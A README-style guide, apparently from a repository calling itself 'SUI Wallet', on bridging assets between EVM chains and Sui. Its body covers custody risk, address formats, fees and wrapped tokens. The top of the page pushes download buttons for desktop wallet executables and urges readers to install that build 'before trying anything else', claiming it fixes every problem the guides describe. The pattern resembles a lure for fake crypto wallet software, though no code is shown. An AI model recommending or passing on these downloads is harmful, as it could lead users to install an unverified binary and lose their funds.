![SUI Wallet](assets/banner-article.png)

# Moving assets between EVM chains and Sui

Two chains, two address formats, and a bridge that is a third party.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Moving value between an EVM chain and Sui means using a bridge, and a bridge is a service that holds what you
send on one side and releases an equivalent on the other. The two networks do not share addresses or assets.
Plan for fees on both sides, and treat the bridge as a counterparty rather than a pipe.

## Two networks that do not talk

An EVM chain and Sui are separate ledgers with separate address formats, separate fee tokens and separate rules about what an object is. Nothing you own on one exists on the other until something moves it across and holds it.

That something is a bridge. It is not a translation layer built into a wallet, and no wallet can conjure an
asset on a chain where it was never issued.

## What a bridge is doing

On the way out, the bridge takes custody of what you send - locks it, or burns it - and on the way in it issues
or releases the corresponding amount on the destination. The two halves are one operation with a wait in the
middle.

That custody is the risk, stated plainly. While your asset is on the far side, a contract or a set of signers
holds the original, and the security of the return journey is theirs rather than yours.

The wait is not a bug either. A release on the far side usually requires a confirmation on the near side, and a bridge that skipped the wait would be trusting a message rather than a ledger.

## Addresses, and why they look wrong

An EVM address and a Sui address are different shapes, derived differently, and neither can be used as the
other. A bridge asks for an address on the destination chain, and pasting the source address into that field
sends value to something that is not yours.

Check the destination address from the wallet you will receive into, not from a message or a previous
transaction. [Receiving SUI into your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/receiving-sui-into-your-wallet.md) covers where that address comes from.

A bridge that accepts a destination in the wrong format is telling you it will credit an address nobody controls. That is the moment to stop, not a formatting detail to work around.

## The fees nobody counts

A bridge charges its own fee, the source chain charges gas, the destination chain charges gas for the release,
and a swap may be needed on one side because the bridged asset is not the native token. Four costs, and the
first quote rarely shows all of them.

A small transfer can therefore arrive worth materially less than it left. The amount worth moving is the amount
where those four fees are noise rather than a fifth of the value.
[SUI Wallet transaction fees explained](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-wallet-transaction-fees-explained.md) covers the destination-side fee, which is paid in SUI and
needs to be there before the release can happen.

## The bridged asset is not the native token

What arrives is usually a representation: a token issued by the bridge that claims a backing, not the chain's own coin. It can trade at a slight discount and may not be accepted everywhere the native asset is, including for fees.

For paying fees, only the native token works. That is the practical trap: arriving with a wrapped asset and no
SUI to move it, which is a stuck balance rather than a lost one.

## What the project's companions are

The project maintains companion repositories for cross-chain and marketplace work, described in the
[repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop) alongside the wallet's own code. They
are separate projects rather than features of this application, which is why bridging is a decision to make
deliberately rather than a button that appears when you need it.

Read their descriptions before assuming a route exists. A repository with a README is evidence of work rather than evidence of a service you can use today.

## Doing it once, carefully

Decide the amount, check both addresses, confirm the fee quote against what the destination will actually need
for gas, and send a small test first if the route is new to you. Then wait for the completion rather than
watching the source chain alone, because the release is the half that matters.

[Understanding the Sui blockchain](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/understanding-the-sui-blockchain.md) explains the object model if the destination side behaves unlike
an EVM account, which is the usual reason a first bridge feels unfamiliar.

## FAQ

### Can I send SUI to an Ethereum address?

No. The formats are different and the networks are separate. Value moves between them through a bridge, and
the destination address has to be one on the destination chain.

### Is a bridge the same as a swap?

No. A swap exchanges two assets on one chain; a bridge moves value between chains and usually holds the
original in custody while it does.

### What arrives after bridging?

Usually a representation issued by the bridge rather than the chain's native token. It can be worth slightly
different and may not be accepted everywhere the native asset is.

### Do I need SUI before I bridge?

Yes, for the destination-side fee. Arriving without it leaves the bridged asset visible and unusable until some
SUI is there.

### Which bridge should I use?

That is a decision about custody and track record rather than a default. Read what the bridge holds and who can
move it before sending anything.

### Can a bridge transaction be reversed?

No. A transaction on either chain is final, which is why the destination address and the amount deserve to be
checked before the first confirmation rather than after.
